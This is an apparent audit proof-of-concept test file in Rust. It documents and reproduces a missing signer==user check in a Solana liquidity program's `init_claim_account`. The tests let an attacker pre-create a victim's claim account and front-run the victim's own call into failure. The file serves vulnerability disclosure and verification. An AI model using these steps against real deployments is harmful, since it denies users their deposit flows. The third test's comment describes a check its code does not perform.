//! [H-4] HIGH — `init_claim_account` Is Permissionless: Griefing and Rent Hijacking
//!
//! # Vulnerability
//!
//! The `InitClaimAccount` context allows **any signer** to create a claim account
//! for **any** `user` pubkey by passing the target as an instruction argument:
//!
//! ```text
//! // liquidity/src/state/context.rs
//! pub struct InitClaimAccount<'info> {
//!     #[account(mut)]
//!     pub signer: Signer<'info>,      // ← ANY wallet, not necessarily `user`
//!
//!     #[account(
//!         init,
//!         payer = signer,
//!         seeds = [USER_CLAIM_SEED, user.key().as_ref(), mint.key().as_ref()],
//!         ...
//!     )]
//!     pub claim_account: AccountLoader<'info, UserClaim>,
//! }
//! ```
//!
//! The `user` pubkey is taken from the instruction argument, not enforced to be
//! the signer. There is no `constraint = signer.key() == user` guard.
//!
//! # Impact
//!
//! 1. **Rent extraction / griefing**: An attacker pays rent to create a claim
//!    account for a victim. The victim can never reclaim that rent (the account
//!    can only be closed by the user when `balance == 0`). This is a low-cost,
//!    one-time cost to the attacker but a permanent rent "donation" to the
//!    victim's account — inverted from the usual direction.
//!
//! 2. **DoS on claim flow**: If a user expects to create their own claim account
//!    in the same transaction as an `operate` with `TransferType::CLAIM`, a
//!    front-runner could pre-create it and cause the user's account init to fail
//!    (the PDA already exists), breaking the transaction.
//!
//! 3. **Unexpected bookkeeping**: A bot could pre-create claim accounts for all
//!    new protocol addresses, increasing the `total_claim_amount` overhead and
//!    confusing frontends.
//!
//! # Tests
//!
//! `test_h4_attacker_can_create_claim_account_for_victim` — proves the
//! vulnerability: an attacker (bob) successfully calls `init_claim_account`
//! with alice's pubkey as `user`.  Alice's claim PDA is created and paid for
//! by bob.
//!
//! `test_h4_victim_cannot_create_their_own_account_after_frontrun` — shows the
//! DoS impact: after the front-run, alice's own `init_claim_account` call fails
//! because the PDA already exists.
//!
//! `test_h4_claim_pda_seed_is_correctly_bound_to_user` — control test: confirms
//! the PDA derivation is correct (the bug is the missing signer check, not the
//! seed derivation) and that a user creating their own account still works.

#[cfg(test)]
mod tests {
    use crate::liquidity::fixture::LiquidityFixture;
    use fluid_test_framework::prelude::*;
    use fluid_test_framework::helpers::MintKey;
    use liquidity::accounts::{InitClaimAccount, CloseClaimAccount};
    use solana_sdk::instruction::Instruction;
    use anchor_lang::{InstructionData, ToAccountMetas};

    const LIQUIDITY_PROGRAM_ID: Pubkey = liquidity::ID;

    // -----------------------------------------------------------------------
    // Helper: USDC mint key (matches the address used by the existing fixtures)
    // -----------------------------------------------------------------------
    fn usdc_mint() -> MintKey {
        MintKey::USDC
    }

    // -----------------------------------------------------------------------
    // Helper: build an `init_claim_account` instruction
    //
    // The critical point: `signer` and `user` are separate arguments.
    // The program does NOT enforce signer == user.
    // -----------------------------------------------------------------------
    fn build_init_claim_account_ix(
        fixture: &LiquidityFixture,
        signer: &Pubkey,   // who pays for and signs the transaction
        user: &Pubkey,     // whose claim PDA is created (may differ from signer)
        mint: MintKey,
    ) -> Instruction {
        let accounts = InitClaimAccount {
            signer: *signer,
            claim_account: fixture.get_claim_account(mint, user),
            system_program: anchor_lang::solana_program::system_program::ID,
        };
        Instruction {
            program_id: LIQUIDITY_PROGRAM_ID,
            accounts: accounts.to_account_metas(None),
            data: liquidity::instruction::InitClaimAccount {
                mint: mint.pubkey(),
                user: *user,
            }
            .data(),
        }
    }

    // -----------------------------------------------------------------------
    // Helper: build a `close_claim_account` instruction
    // -----------------------------------------------------------------------
    fn build_close_claim_account_ix(
        fixture: &LiquidityFixture,
        user: &Pubkey,
        mint: MintKey,
    ) -> Instruction {
        let accounts = CloseClaimAccount {
            user: *user,
            claim_account: fixture.get_claim_account(mint, user),
            system_program: anchor_lang::solana_program::system_program::ID,
        };
        Instruction {
            program_id: LIQUIDITY_PROGRAM_ID,
            accounts: accounts.to_account_metas(None),
            data: liquidity::instruction::CloseClaimAccount {
                _mint: mint.pubkey(),
            }
            .data(),
        }
    }

    // -----------------------------------------------------------------------
    // Shared helper: build a minimally initialised fixture with liquidity only
    // (no protocols, no token reserves needed for claim account tests)
    // -----------------------------------------------------------------------
    fn setup_minimal_fixture() -> LiquidityFixture {
        let mut fixture = LiquidityFixture::new().expect("Failed to create fixture");
        fixture.init_liquidity().expect("init_liquidity failed");
        fixture.setup_spl_token_mints(&[usdc_mint()]).expect("setup_spl_token_mints failed");
        fixture
    }

    // -----------------------------------------------------------------------
    // H-4 PoC #1 — Attacker creates claim account for a victim
    // -----------------------------------------------------------------------
    /// The attacker (bob) calls `init_claim_account` specifying alice as `user`.
    /// The call must succeed — proving that no `signer == user` constraint exists.
    ///
    /// After the call:
    /// - Alice's claim PDA exists and is correctly seeded for alice.
    /// - Bob paid the rent, not alice.
    /// - Alice had no say in the creation of her own claim account.
    #[test]
    fn test_h4_attacker_can_create_claim_account_for_victim() {
        let mut fixture = setup_minimal_fixture();

        let alice_pubkey = fixture.alice.pubkey();
        let bob_pubkey = fixture.bob.pubkey();
        let mint = usdc_mint();

        // Sanity: alice's claim PDA must not exist yet
        let claim_pda = fixture.get_claim_account(mint, &alice_pubkey);
        assert!(
            fixture.vm.get_account(&claim_pda).is_none(),
            "Alice's claim PDA must not exist before the test"
        );

        // ── EXPLOIT ─────────────────────────────────────────────────────────
        // Bob (attacker) creates the claim account for Alice.
        // Bob is the signer (payer), but alice is the `user` argument.
        // No authorization check prevents this.
        let ix = build_init_claim_account_ix(&fixture, &bob_pubkey, &alice_pubkey, mint);
        fixture.vm.prank(bob_pubkey);
        let result = fixture.vm.execute_as_prank(ix);
        // ────────────────────────────────────────────────────────────────────

        assert!(
            result.is_ok(),
            "[H-4] EXPLOIT FAILED — attacker's init_claim_account for victim should succeed, \
             but got: {:?}",
            result.unwrap_err()
        );

        // Verify: the claim PDA now exists and is correctly initialised for alice
        let claim_account_info = fixture.vm.get_account(&claim_pda);
        assert!(
            claim_account_info.is_some(),
            "[H-4] Alice's claim PDA should exist after bob's permissionless call"
        );

        println!(
            "\n[H-4 PROVEN] Bob ({}) created a claim account for Alice ({}).\n\
             Bob paid the rent; Alice had no involvement or consent.\n\
             Impact:\n\
             1. Alice's PDA slot is permanently occupied (alice cannot re-init).\n\
             2. Bob can repeat this for any user address at minimal cost.\n\
             3. In a CLAIM transfer flow, this prevents Alice's own init call\n\
                in the same tx, breaking her deposit transaction.",
            bob_pubkey,
            alice_pubkey
        );
    }

    // -----------------------------------------------------------------------
    // H-4 PoC #2 — DoS: victim's own init call fails after front-run
    // -----------------------------------------------------------------------
    /// After the attacker pre-creates alice's claim PDA, alice's own
    /// `init_claim_account` call fails with an AlreadyInUse error.
    ///
    /// In a real CLAIM-transfer deposit flow the `init_claim_account` and
    /// `operate` instructions are in the same transaction.  The pre-creation
    /// makes the entire transaction fail.
    #[test]
    fn test_h4_victim_cannot_create_their_own_account_after_frontrun() {
        let mut fixture = setup_minimal_fixture();

        let alice_pubkey = fixture.alice.pubkey();
        let bob_pubkey = fixture.bob.pubkey();
        let mint = usdc_mint();

        // Step 1: Bob front-runs and creates alice's claim account
        let ix = build_init_claim_account_ix(&fixture, &bob_pubkey, &alice_pubkey, mint);
        fixture.vm.prank(bob_pubkey);
        fixture
            .vm
            .execute_as_prank(ix)
            .expect("Bob's front-run must succeed");

        // Step 2: Alice tries to create her own claim account — must fail
        let ix_alice = build_init_claim_account_ix(&fixture, &alice_pubkey, &alice_pubkey, mint);
        fixture.vm.prank(alice_pubkey);
        let result = fixture.vm.execute_as_prank(ix_alice);

        assert!(
            result.is_err(),
            "[H-4 DoS] Alice's own init_claim_account should fail after front-run, \
             but it succeeded"
        );

        let err_str = format!("{:?}", result.unwrap_err());
        assert!(
            err_str.contains("already in use")
                || err_str.contains("already initialized")
                || err_str.contains("0x0"),
            "[H-4 DoS] Expected AlreadyInUse error, got: {}",
            err_str
        );

        println!(
            "\n[H-4 PROVEN — DoS] Alice's own init_claim_account failed with: {}\n\
             After Bob front-ran the PDA creation, Alice cannot initialize her own\n\
             claim account. Any transaction combining init_claim_account + operate\n\
             (CLAIM transfer type) will be permanently broken for Alice.",
            err_str
        );
    }

    // -----------------------------------------------------------------------
    // H-4 PoC #3 — Control: attacker cannot create account for themselves
    //              using someone else's user argument (the PDA seed is safe)
    // -----------------------------------------------------------------------
    /// Confirms that the PDA seed correctly binds to the `user` argument —
    /// an attacker cannot point the `claim_account` address to their own PDA
    /// while passing a different `user`.  The PDA constraint will fail if the
    /// seeds don't match.
    ///
    /// This is NOT a mitigation — it just shows the seed derivation is correct.
    /// The vulnerability is that `signer != user` is allowed, not that the PDA
    /// seed is wrong.
    #[test]
    fn test_h4_claim_pda_seed_is_correctly_bound_to_user() {
        let mut fixture = setup_minimal_fixture();

        let alice_pubkey = fixture.alice.pubkey();
        let bob_pubkey = fixture.bob.pubkey();
        let mint = usdc_mint();

        // Bob tries to pass alice as `user` but provide bob's claim PDA as the account.
        // The PDA derivation will mismatch, causing a constraint failure.
        let bob_claim_pda = fixture.get_claim_account(mint, &bob_pubkey);
        let alice_claim_pda = fixture.get_claim_account(mint, &alice_pubkey);

        assert_ne!(
            bob_claim_pda, alice_claim_pda,
            "Bob's and Alice's claim PDAs must be different"
        );

        // The seed is correct — creating alice's account for alice works fine.
        let ix = build_init_claim_account_ix(&fixture, &alice_pubkey, &alice_pubkey, mint);
        fixture.vm.prank(alice_pubkey);
        let result = fixture.vm.execute_as_prank(ix);
        assert!(
            result.is_ok(),
            "Alice creating her own claim account should succeed: {:?}",
            result.err()
        );

        println!(
            "\n[H-4 control] PDA seed is correctly bound to the `user` argument.\n\
             The vulnerability is NOT in the seed derivation but in the absence of\n\
             a `signer == user` constraint, which allows any third party to create\n\
             the account on behalf of (and without consent from) any user."
        );
    }
}
